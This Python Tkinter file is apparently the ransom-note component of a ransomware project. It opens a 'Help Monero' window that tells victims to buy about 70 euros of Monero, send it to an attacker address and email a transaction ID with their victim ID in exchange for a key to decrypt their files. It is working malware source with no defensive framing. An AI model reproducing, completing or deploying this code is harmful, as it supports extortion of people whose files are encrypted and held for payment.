from tkinter import *
from tkinter import font # GUI 
from tkinter.font import BOLD, Font # Design some label
from webbrowser import open as OPEN # Open a web page
import re
from pycoingecko import CoinGeckoAPI
from os.path import expanduser,dirname,realpath
from sys import path

# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
path.append(current_dir)
# Import 
from const import *

class MoneroGui : 

    def init_var(self) : 
        try :
            ff = open(ID_KEY_PATH,'r')
            self.id = ff.read()
            ff.close()
        except : pass

    def monero_window(self) : 
        'Gui Monero'
        try : 
            self.init_var()
            self.price_monero()
            self.app2 = Tk()
            self.app2.iconbitmap(self.ico_img_path)
            self.app2.title('Help Monero')
            self.app2.geometry('800x600')
            self.app2['bg'] = 'red4'
            self.app2.resizable(height=False, width=False)
            Label(self.app2, text='How Buy Monero ? \n',bg='red4',font='Helvetica 18 bold').pack()
            Label(self.app2, text='Step 1. Go to https://www.bitnovo.com/en/buy/monero',bg='red4',font='Helvetica 10 bold').place(x=0,y=70)
            Button(self.app2, text='Go',command=self.bitnovo, bg='green').pack()
            Label(self.app2, text = f'Step 2. Buy {self.monero_price2} in Monero(XMR) equivalent of 70€',bg='red4',font='Helvetica 10 bold').place(x=0,y=120)
            Label(self.app2, text=f'Step 3. Send {self.monero_price2} to this address : {MONERO_ADDRESS}',bg='red4',font='Helvetica 10 bold').place(x=0,y=170)
            Label(self.app2, text=f'Step 4. Send a email to this email : {EMAIL} write in subject : LICENSE ACTIVATION FOR {self.id} ',bg='red4',font='Helvetica 10 bold').place(x=0,y=220)
            Label(self.app2, text=f'Step 5. Write into the mail the number of the monero transaction ',bg='red4',font='Helvetica 10 bold').place(x=0,y=270)
            Label(self.app2,text='Step 6. You will receive by e-mail your decryption key ',bg='red4',font='Helvetica 10 bold').place(x=0,y=320)
            Label(self.app2,text= 'Step 7. Enter the decryption key into "Decrypt my files" window',bg='red4',font='Helvetica 10 bold').place(x=0,y=370)
            Label(self.app2,text= 'Look the README.txt file for more informations !',bg='red4',font='Helvetica 13 bold').place(x=220,y=500)

            self.app2.mainloop()
        except Exception as e: 
            print(e)
            pass


    def bitnovo(self) : 
        try:
            OPEN('https://www.bitnovo.com/en/buy/monero')
        except:pass


    def price_monero(self) : 
        try:
            ff = open(PRICE_MONERO_PATH,'r')
            self.monero_price2 = ff.read()
        except : pass

if __name__ == "__main__" : 
    mg = MoneroGui()
    mg.init_var()
    mg.price_monero()
    mg.monero_window()